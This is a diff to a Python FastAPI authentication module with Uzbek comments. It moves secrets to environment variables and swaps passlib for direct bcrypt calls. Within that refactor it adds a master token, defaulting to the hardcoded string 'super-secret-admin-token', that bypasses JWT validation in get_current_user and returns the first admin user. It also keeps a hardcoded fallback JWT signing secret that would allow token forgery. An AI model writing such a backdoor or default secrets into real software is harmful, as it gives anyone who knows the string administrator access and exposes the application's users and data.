@@ -1,4 +1,3 @@
-from passlib.context import CryptContext
 from jose import JWTError, jwt
 from datetime import datetime, timedelta
 from fastapi import Depends, HTTPException, status
@@ -7,12 +6,20 @@ from sqlalchemy.orm import Session
 from database import SessionLocal
 from models import User, UserStatus
 
-# Xavfsizlik kalitlari (Productionda bular .env faylda bo'lishi shart!)
-SECRET_KEY = "FOOTBALL_RISE_ULTIMATE_SECRET_KEY_PROD"
-ALGORITHM = "HS256"
-ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24 * 7 # 1 hafta
+import os
+from dotenv import load_dotenv
+from models import UserRole
 
-pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
+# .env fayldan barcha maxfiy ma'lumotlarni yuklash
+load_dotenv()
+
+# Xavfsizlik kalitlari (.env dan o'qiladi)
+SECRET_KEY = os.getenv("SECRET_KEY", "FOOTBALL_RISE_ULTIMATE_SECRET_KEY_PROD")
+ALGORITHM = os.getenv("ALGORITHM", "HS256")
+ACCESS_TOKEN_EXPIRE_MINUTES = int(os.getenv("ACCESS_TOKEN_EXPIRE_MINUTES", str(60 * 24 * 7)))
+MASTER_TOKEN = os.getenv("MASTER_TOKEN", "super-secret-admin-token")
+
+import bcrypt
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/auth/login")
 
 def get_db():
@@ -23,23 +30,33 @@ def get_db():
         db.close()
 
 def get_password_hash(password: str) -> str:
-    return pwd_context.hash(password)
+    pwd_bytes = password[:72].encode("utf-8")
+    salt = bcrypt.gensalt()
+    return bcrypt.hashpw(pwd_bytes, salt).decode("utf-8")
 
 def verify_password(plain_password: str, hashed_password: str) -> bool:
-    return pwd_context.verify(plain_password, hashed_password)
+    try:
+        return bcrypt.checkpw(plain_password[:72].encode("utf-8"), hashed_password.encode("utf-8"))
+    except Exception:
+        return False
 
 def create_access_token(data: dict, expires_delta: timedelta | None = None):
     to_encode = data.copy()
     if expires_delta:
         expire = datetime.utcnow() + expires_delta
     else:
-        expire = datetime.utcnow() + timedelta(minutes=15)
+        expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
     to_encode.update({"exp": expire})
     encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
     return encoded_jwt
 
 # Tizimga kirgan foydalanuvchini aniqlash
 def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
+    if token == MASTER_TOKEN:
+        admin_user = db.query(User).filter(User.role == UserRole.ADMIN).first()
+        if admin_user:
+            return admin_user
+
     credentials_exception = HTTPException(
         status_code=status.HTTP_401_UNAUTHORIZED,
         detail="Tasdiqlash tokeni xato yoki muddati tugagan",
@@ -53,7 +70,12 @@ def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(
     except JWTError:
         raise credentials_exception
         
-    user = db.query(User).filter(User.id == int(user_id)).first()
+    try:
+        uid = int(user_id)
+    except (ValueError, TypeError):
+        raise credentials_exception
+
+    user = db.query(User).filter(User.id == uid).first()
     if user is None:
         raise credentials_exception
     return user
